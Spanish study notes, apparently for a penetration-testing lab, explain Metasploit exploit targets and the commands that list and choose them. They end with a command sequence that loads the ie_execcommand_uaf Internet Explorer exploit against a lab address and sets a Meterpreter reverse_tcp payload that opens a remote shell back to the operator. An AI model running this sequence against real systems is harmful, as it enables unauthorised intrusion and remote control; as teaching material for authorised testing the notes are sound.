Un target es una configuración específica dentro de un módulo de exploit que describe qué versión del sistema (OS / aplicación) es vulnerable y qué técnicas/direcciones debe usar el exploit para funcionar.
Cada target ajusta parámetros (direcciones de retorno, ROP, dependencias) para que el exploit encaje en esa versión concreta.

## Conceptos clave

- Target del tipo **Automatic (0)**: msf intenta detectar la versión del objetivo y elegir el target adecuado automáticamente.
- **Lista de targets**: cada módulo puede exponer varios targets (ej. `IE 8 on Windows 7`, `IE 9 on Windows 7`, etc.) . En el caso del ejemplo, cada línea describe una combinación concreta de **versión de Internet Explorer + sistema operativo** para la que el exploit tiene un _método de explotación_ preparado (offsets, gadgets, técnicas, etc.).
- **`info`**: muestra detalles del módulo (descripción, autores, fecha, targets, dependencias).
- **`show options` / `options`**: lista las opciones configurables del módulo (RHOSTS, RPORT, SRVHOST, payload options...).
- **`show targets`**: lista los targets disponibles para el módulo actual.
- **`set target <id>`**: fija manualmente el target (por ejemplo `set target 6`).
- **Payload options**: ajustes del payload (ej. `LHOST`, `LPORT`, `EXITFUNC`).

## Por qué hay varios targets

Las direcciones de memoria, offsets, dependencias (ej. JRE, `msvcrt`) y el comportamiento interno cambian entre versiones de SO, Service Packs y versiones/idiomas de aplicaciones. El exploit necesita técnicas específicas para cada variante; por eso se listan targets separados.

## Flujo de trabajo típico (guion rápido)

```
# 1. Seleccionar módulo
use exploit/windows/browser/ie_execcommand_uaf

# 2. Ver info del módulo (recomendado)
info

# 3. Ver opciones y payloads
show options
show payloads

# 4. Ver targets disponibles
show targets

# 5. Si conoces la versión del objetivo:
set target 6           # (ejemplo: selecciona el target con id 6)

# 6. Configurar opciones principales
set RHOSTS 10.10.10.40
set SRVHOST 0.0.0.0
set SRVPORT 8080

# 7. Configurar payload
set payload windows/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT 4444

# 8. Comprobar todo
show options

# 9. Ejecutar
exploit

```

